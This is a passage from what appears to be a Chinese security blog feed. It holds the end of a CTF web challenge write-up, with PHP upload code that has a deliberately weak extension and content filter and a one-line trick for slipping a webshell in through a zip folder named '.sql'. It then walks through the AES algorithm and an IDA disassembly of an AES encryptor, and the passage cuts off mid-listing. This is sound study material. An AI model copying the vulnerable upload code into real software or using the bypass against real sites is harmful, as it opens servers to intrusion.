class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span>!=<span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fullpath</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$fullpath</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">deldir</span>(<span class="variable">$fullpath</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dh</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//删除当前文件夹：</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">rmdir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$userdir</span> = <span class="string">&quot;./sandbox/user_&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$f_path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;No Hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==False) <span class="keyword">die</span>(<span class="string">&quot;No Hacker&quot;</span>);</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$f_path</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$f_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$extension</span> == <span class="string">&#x27;zip&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$patten</span> = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line">        <span class="variable">$random</span> =  <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$random</span>) &lt; <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="variable">$rand</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$patten</span>));</span><br><span class="line">                <span class="variable">$random</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$patten</span>, <span class="variable">$rand</span>, <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$tagdir</span> = <span class="variable">$userdir</span> . <span class="string">&#x27;tmp_&#x27;</span> . <span class="variable">$random</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$tagdir</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">fzip_open</span>(<span class="variable">$f_path</span>, <span class="variable">$tagdir</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">moveSqlFile</span>(<span class="variable">$tagdir</span>, <span class="variable">$userdir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>非预期</strong><br>传入一个压缩包，其中包含以<code>.sql</code>结尾的文件夹，文件夹里是webshell，上传压缩包后触发moveSqlFile把文件夹移动到用户目录下，直接连接拿到flag</p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>AES加密算法逆向分析</title>
    <url>/2022/05/10/aes/</url>
    <content><![CDATA[<h1 id="AES加密算法介绍"><a href="#AES加密算法介绍" class="headerlink" title="AES加密算法介绍"></a>AES加密算法介绍</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法，对称加密算法也就是加密和解密用相同的密钥，AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：<br><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102136290.png" alt="image-20220510213651221"></p>
<p>AES加密过程涉及到4种操作：字节代换（SubBytes）、行移位（ShiftRows）、列混合（MixColumns）和轮密钥加（AddRoundKey）。解密过程分别为对应的逆操作。由于每一步操作都是可逆的，按照相反的顺序进行解密即可恢复明文。加解密中每轮的密钥分别由初始密钥扩展得到。算法中16字节的明文、密文和轮密钥都以一个4x4的矩阵表示。</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102138259.png" alt="技术分享"></p>
<h2 id="0x01-字节代换"><a href="#0x01-字节代换" class="headerlink" title="0x01 字节代换"></a>0x01 字节代换</h2><p>AES定义了一个S盒和一个逆S盒。</p>
<p>AES的S盒：</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102145653.png" alt="image-20220510214505595"></p>
<p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102146710.png" alt="image-20220510214603675"></p>
<p>AES的逆S盒：同理</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102147610.png" alt="image-20220510214722557"></p>
<h2 id="0x02-行移位"><a href="#0x02-行移位" class="headerlink" title="0x02 行移位"></a>0x02 行移位</h2><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，逆变化同理，如下图所示：</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102152365.png" alt="image-20220510215200314"></p>
<h2 id="0x03-列混合"><a href="#0x03-列混合" class="headerlink" title="0x03 列混合"></a>0x03 列混合</h2><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102152257.png" alt="col"></p>
<p>逆变化同理：</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102153482.png" alt="image-20220510215300454"></p>
<h2 id="0x04-轮密钥加"><a href="#0x04-轮密钥加" class="headerlink" title="0x04 轮密钥加"></a>0x04 轮密钥加</h2><p>加密过程中，每轮的输入与轮密钥异或一次；因此，解密时再异或上该轮的密钥即可恢复输入。</p>
<h2 id="0x05-密钥扩展"><a href="#0x05-密钥扩展" class="headerlink" title="0x05 密钥扩展"></a>0x05 密钥扩展</h2><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205102155420.png" alt="技术分享"></p>
<h1 id="AESEnc-exe逆向分析"><a href="#AESEnc-exe逆向分析" class="headerlink" title="AESEnc.exe逆向分析"></a>AESEnc.exe逆向分析</h1><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205110026882.png" alt="image-20220511002635803"></p>
<p>首先进入main函数，上来就是一堆var变量的赋值，我们不用管继续看后面，然后再开始了数组的赋值，这里的var_20被连续赋值了16个字节，最后加上了一个0，可以猜测这个var_20就是密钥，正好16位，改名为key，后面的var_50暂时不知道，反正是32个字节，然后又是一大堆赋值，这里的var_70一共32字节，还不知道是什么含义，暂且跳过，后面赋值的4个0也不知道啥玩意，不管他</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205110036332.png" alt="image-20220511003605298"></p>
<p>这里scanf函数的参数是var_50，可以知道var_50应该是用户输入的明文，重新改一下名字为data，下一个函数就算aesEncrypt，他的参数一共5个，第一个参数是var_20，也就是密钥key，第二个是常数10h，也就是16，第三个是var_50，也就是data，第四个是var_90，暂时未知，第五个是常值20h，为32那么下面就是要分析加密函数内部逻辑了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">sub     rsp, 1D0h</span><br><span class="line">lea     rbp, [rsp+80h]</span><br><span class="line">mov     [rbp+150h+Src], rcx </span><br><span class="line">mov     dword ptr [rbp+150h+Size], edx </span><br><span class="line">mov     [rbp+150h+arg_10], r8 </span><br><span class="line">mov     [rbp+150h+arg_18], r9</span><br><span class="line">mov     rax, [rbp+150h+arg_18]</span><br><span class="line">mov     [rbp+150h+var_10], rax</span><br><span class="line">lea     rax, [rbp+150h+var_180]</span><br><span class="line">mov     [rbp+150h+var_18], rax</span><br><span class="line">mov     [rbp+150h+var_190], 0</span><br><span class="line">mov     [rbp+150h+var_188], 0</span><br><span class="line">mov     [rbp+150h+var_1A0], 0</span><br><span class="line">mov     [rbp+150h+var_198], 0</span><br><span class="line">mov     [rbp+150h+var_1B0], 0</span><br><span class="line">mov     [rbp+150h+var_1A8], 0</span><br><span class="line">cmp     [rbp+150h+Src], 0</span><br><span class="line">jz      short loc_401E96</span><br></pre></td></tr></table></figure>

<p>先看看开头的初始化工作，rcx赋值给Src，所以Src应该是等于密钥key，edx存储的是常数16，猜测应该是key长度keylen，也就是Size,，后面的r8和r9分别是传进来的明文输入pt，以及密文存放的位置ct，还剩下一个参数32应该就是密文明文的长度，这里把各个参数名字都改一下方便阅读</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205111130164.png" alt="image-20220511113006065"></p>
<p>接下来是四个分支，前三个是判断密钥，明文，密文都不为空，最后一个是判断密钥长度是否大于等于16</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205111222137.png" alt="image-20220511122255109"></p>
<p>这里对第五个参数进行了判断，先赋值给eax，再和0Fh按位与，这一步就是检查最后四位是不是0，如果最后四位是0，那么就进入下一个分支，如果不是0就退出，这里应该是要确保密文明文的长度是16的倍数，便于加密</p>
<p>下一个函数就是密钥扩展函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401EEE:</span><br><span class="line">mov     edx, dword ptr [rbp+150h+keylen]</span><br><span class="line">lea     rax, [rbp+150h+realKEY]</span><br><span class="line">mov     r8, rdx         ; Size</span><br><span class="line">mov     rdx, [rbp+150h+key] ; Src</span><br><span class="line">mov     rcx, rax        ; void *</span><br><span class="line">call    memcpy</span><br><span class="line">lea     rdx, [rbp+150h+aesKEY]</span><br><span class="line">lea     rax, [rbp+150h+realKEY]</span><br><span class="line">mov     r8, rdx</span><br><span class="line">mov     edx, 10h</span><br><span class="line">mov     rcx, rax</span><br><span class="line">call    keyExpansion</span><br><span class="line">mov     [rbp+150h+var_4], 0</span><br><span class="line">jmp     loc_402016</span><br><span class="line"></span><br><span class="line">loc_402016:</span><br><span class="line">mov     eax, [rbp+150h+var_4]</span><br><span class="line">cmp     [rbp+150h+inlen], eax</span><br><span class="line">ja      loc_401F31</span><br></pre></td></tr></table></figure>

<p>memcpy函数传入了三个参数，首先是一个空指针，第二个是我们的传入的密钥key，第三个是传入的密钥长度src，那么这里的作用应该是把key复制到一个新的数组里面</p>
<p>接下来的keyExpansion也是一共三个参数，我们已知aes的密钥扩展函数是要将密钥循环扩展到44个字，那么可以猜测传入的第三个参数r8是扩展后的密钥存储的地方</p>
<p>接下来把var4赋值为0，并且和inlen进行比较，再进入循环，可以看出这个var_4是控制循环的变量，而后在循环末端又有var_4+10h，可见这个大循环一共两次，那么这里一定是将明文进行分组，依次加密</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112129567.png" alt="image-20220511212912525"></p>
<p>再看循环内的流程，loadStateArray函数讲我们的明文pt处理后放入var_1B0中，那一步应该是初始化状态矩阵，紧随其后的addRoundKey也证明了这一点，传入的参数是var_1B0和var_18，通过回顾前面的变量定义可以知道，var_18是一个指向扩展后的aesKEY的指针，且var_18在左边的循环中每一轮都会增加10h，也就是16，所以这一步就是轮密钥加</p>
<p>然后下一个循环时用var_8控制的，初始值为1，每一轮加1，jle是小于等于，那左边这个循环一共执行九次，左边的大体流程是，subBytes，shiftRows，mixColumns，addRoundKey，第十次执行右边，但是少了一个mixColumns，</p>
<p>讲经过了10轮加密后的状态矩阵var_1B0传给var_10，也就是指向ct的指针，然后用storeStateArray复制过去</p>
<p>然后再跳回原来的大循环，那么总体框架就如此，这就是aes的十轮加密，每一轮都会更新状态矩阵，接下来再来分析每一个小函数的作用</p>
<h2 id="0x01-subBytes"><a href="#0x01-subBytes" class="headerlink" title="0x01 subBytes"></a>0x01 subBytes</h2><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112155860.png" alt="image-20220511215504825"></p>
<p>这个函数的总体结构是第一层循环4次，第二层循环四次，正好对应了16个字节的状态矩阵4行4列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401A03:</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rdx, rax</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">movzx   eax, byte ptr [rdx+rax]</span><br><span class="line">movzx   eax, al</span><br><span class="line">mov     edx, [rbp+var_4]</span><br><span class="line">movsxd  rdx, edx</span><br><span class="line">lea     rcx, ds:0[rdx*4]</span><br><span class="line">mov     rdx, [rbp+arg_0]</span><br><span class="line">add     rcx, rdx</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, RijnDael_AES_LONG_404020</span><br><span class="line">movzx   eax, byte ptr [rax+rdx]</span><br><span class="line">mov     edx, [rbp+var_8]</span><br><span class="line">movsxd  rdx, edx</span><br><span class="line">mov     [rcx+rdx], al</span><br><span class="line">add     [rbp+var_8], 1</span><br></pre></td></tr></table></figure>

<p>循环中的RijnDael_AES_LONG_404020便是S盒</p>
<h2 id="0x02-shiftRows"><a href="#0x02-shiftRows" class="headerlink" title="0x02 shiftRows"></a>0x02 shiftRows</h2><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112211702.png" alt="image-20220511221149672"></p>
<p>一共四层循环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401A95:</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rdx</span><br><span class="line">movzx   eax, byte ptr [rax]</span><br><span class="line">movzx   eax, al</span><br><span class="line">shl     eax, 18h</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rcx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rcx</span><br><span class="line">movzx   eax, byte ptr [rax+1]</span><br><span class="line">movzx   eax, al</span><br><span class="line">shl     eax, 10h</span><br><span class="line">or      edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rcx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rcx</span><br><span class="line">movzx   eax, byte ptr [rax+2]</span><br><span class="line">movzx   eax, al</span><br><span class="line">shl     eax, 8</span><br><span class="line">or      edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rcx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rcx</span><br><span class="line">movzx   eax, byte ptr [rax+3]</span><br><span class="line">movzx   eax, al</span><br><span class="line">or      edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     dword ptr [rbp+rax*4+var_20], edx</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     edx, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">shl     eax, 3</span><br><span class="line">mov     ecx, eax</span><br><span class="line">shl     edx, cl</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     r8d, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">mov     eax, 4</span><br><span class="line">sub     eax, [rbp+var_4]</span><br><span class="line">shl     eax, 3</span><br><span class="line">mov     ecx, eax</span><br><span class="line">shr     r8d, cl</span><br><span class="line">mov     eax, r8d</span><br><span class="line">or      edx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     dword ptr [rbp+rax*4+var_20], edx</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     eax, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">shr     eax, 18h</span><br><span class="line">mov     ecx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, ecx</span><br><span class="line">mov     [rax], dl</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     eax, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">shr     eax, 10h</span><br><span class="line">mov     ecx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, ecx</span><br><span class="line">mov     [rax+1], dl</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     eax, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">shr     eax, 8</span><br><span class="line">mov     ecx, eax</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, ecx</span><br><span class="line">mov     [rax+2], dl</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">mov     ecx, dword ptr [rbp+rax*4+var_20]</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, ecx</span><br><span class="line">mov     [rax+3], dl</span><br><span class="line">add     [rbp+var_4], 1</span><br></pre></td></tr></table></figure>

<p>每一层都是把数组中的四个字节取出来，每次用shl把eax左移指定位数</p>
<h2 id="0x03-mixColumns"><a href="#0x03-mixColumns" class="headerlink" title="0x03 mixColumns"></a>0x03 mixColumns</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">push    rbx</span><br><span class="line">sub     rsp, 58h</span><br><span class="line">lea     rbp, [rsp+80h]</span><br><span class="line">mov     [rbp-20h+arg_0], rcx</span><br><span class="line">mov     [rbp-20h+var_40], 2</span><br><span class="line">mov     [rbp-20h+var_3F], 3</span><br><span class="line">mov     [rbp-20h+var_3E], 1</span><br><span class="line">mov     [rbp-20h+var_3D], 1</span><br><span class="line">mov     [rbp-20h+var_3C], 1</span><br><span class="line">mov     [rbp-20h+var_3B], 2</span><br><span class="line">mov     [rbp-20h+var_3A], 3</span><br><span class="line">mov     [rbp-20h+var_39], 1</span><br><span class="line">mov     [rbp-20h+var_38], 1</span><br><span class="line">mov     [rbp-20h+var_37], 1</span><br><span class="line">mov     [rbp-20h+var_36], 2</span><br><span class="line">mov     [rbp-20h+var_35], 3</span><br><span class="line">mov     [rbp-20h+var_34], 3</span><br><span class="line">mov     [rbp-20h+var_33], 1</span><br><span class="line">mov     [rbp-20h+var_32], 1</span><br><span class="line">mov     [rbp-20h+var_31], 2</span><br><span class="line">mov     [rbp-20h+var_14], 0</span><br><span class="line">jmp     short loc_401D14</span><br></pre></td></tr></table></figure>

<p>开头是一段赋值，这里赋值的是列混合矩阵，列混合的操作就是用矩阵乘法实现的，但是这里面的流程图非常混乱，我直接看了伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">mixColumns</span><span class="params">(__int64 state)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+21h] [rbp-5Fh]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+22h] [rbp-5Eh]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">37</span>]; <span class="comment">// [rsp+23h] [rbp-5Dh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4Ch] [rbp-34h]</span></span><br><span class="line">  _DWORD tmp[<span class="number">4</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">2</span>;</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  s[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">  s[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">7</span>] = <span class="number">2</span>;</span><br><span class="line">  s[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">  s[<span class="number">9</span>] = <span class="number">3</span>;</span><br><span class="line">  s[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  s[<span class="number">12</span>] = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">      *((_BYTE *)&amp;tmp[i - <span class="number">8</span>] + j) = *(_BYTE *)(state + <span class="number">4</span>i64 * i + j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = GMul((<span class="type">unsigned</span> __int8)*(&amp;v5 + <span class="number">4</span> * i), (<span class="type">unsigned</span> __int8)s[j + <span class="number">13</span>]);</span><br><span class="line">      v2 = GMul((<span class="type">unsigned</span> __int8)*(&amp;v6 + <span class="number">4</span> * i), (<span class="type">unsigned</span> __int8)s[j + <span class="number">17</span>]) ^ v1;</span><br><span class="line">      v3 = GMul((<span class="type">unsigned</span> __int8)*(&amp;v7 + <span class="number">4</span> * i), (<span class="type">unsigned</span> __int8)s[j + <span class="number">21</span>]) ^ v2;</span><br><span class="line">      *(_BYTE *)(state + <span class="number">4</span>i64 * i + j) = v3 ^ GMul((<span class="type">unsigned</span> __int8)s[<span class="number">4</span> * i], (<span class="type">unsigned</span> __int8)s[j + <span class="number">25</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个循环时把状态数组state放入临时数组tmp中，而第二个循环中是把s数组的行和tmp数组的列进行分别相乘相加，也就是矩阵乘法，但是这里的乘法是在G（2^8）下得到的，函数GMul就是实现这个功能的，循环内一共有四个表达式，计算的v1保留，第二次计算的结果和v1按位异或得到v2一直重复四次，最终的结果放回状态数组state中</p>
<h2 id="0x04-addRoundKey"><a href="#0x04-addRoundKey" class="headerlink" title="0x04 addRoundKey"></a>0x04 addRoundKey</h2><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205112236062.png" alt="image-20220511223646024"></p>
<p>轮密钥加的结构主要由两个循环构成，一共16次，每次都是把轮密钥的对应位和状态矩阵对应位进行异或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401921:</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_8]</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     edx, [rax]</span><br><span class="line">mov     eax, 3</span><br><span class="line">sub     eax, [rbp+var_4]</span><br><span class="line">shl     eax, 3</span><br><span class="line">mov     ecx, eax</span><br><span class="line">shr     edx, cl</span><br><span class="line">mov     eax, edx</span><br><span class="line">mov     ecx, eax</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">mov     edx, [rbp+var_4]</span><br><span class="line">movsxd  rdx, edx</span><br><span class="line">shl     rdx, 2</span><br><span class="line">add     rdx, rbp</span><br><span class="line">add     rax, rdx</span><br><span class="line">sub     rax, 20h ; &#x27; &#x27;</span><br><span class="line">mov     [rax], cl</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">cdqe</span><br><span class="line">lea     rdx, ds:0[rax*4]</span><br><span class="line">mov     rax, [rbp+arg_0]</span><br><span class="line">add     rdx, rax</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">movzx   r8d, byte ptr [rdx+rax]</span><br><span class="line">mov     eax, [rbp+var_8]</span><br><span class="line">cdqe</span><br><span class="line">mov     edx, [rbp+var_4]</span><br><span class="line">movsxd  rdx, edx</span><br><span class="line">shl     rdx, 2</span><br><span class="line">add     rdx, 